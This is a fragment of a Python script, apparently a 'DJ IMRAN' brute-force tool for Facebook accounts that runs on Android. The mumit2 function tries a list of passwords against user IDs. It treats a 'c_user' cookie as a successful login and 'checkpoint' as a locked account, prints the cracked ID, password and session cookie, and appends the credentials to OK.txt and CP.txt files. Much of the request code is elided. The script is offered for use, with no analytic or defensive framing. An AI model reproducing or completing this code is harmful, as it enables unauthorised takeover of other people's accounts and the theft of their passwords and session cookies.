...
def fuck():
    ...
    print(' [+] OK Ids saved in DJ IMRAN/OK.txt')
    print(' [+] CP Ids saved in DJ IMRAN/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[DJ IMRAN]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[DJ IMRAN-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/DJ IMRAN/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[DJ IMRAN-CP] {cid}|{ps}")
                open('/sdcard/DJ IMRAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
